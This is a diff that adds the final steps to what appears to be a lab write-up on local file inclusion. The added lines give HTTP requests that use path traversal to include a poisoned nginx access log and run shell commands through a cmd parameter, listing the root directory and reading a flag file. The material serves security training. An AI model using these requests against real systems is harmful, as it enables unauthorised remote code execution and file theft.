@@ -196,3 +196,14 @@ ffuf -c -ic -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ
 
 ![LFI-skills-assess-log-poison](/images/LFI-skills-assess-log-poison.png)  
 
+>Once the logs are poisoned with PHP code, we can execute webshell commands on target.  
+
+```
+GET /ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log&cmd=ls+/+-al HTTP/1.1
+```  
+
+>Obtain the flag on target with RCE.  
+
+```
+/ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log&cmd=cat+/flag_.txt
+```  
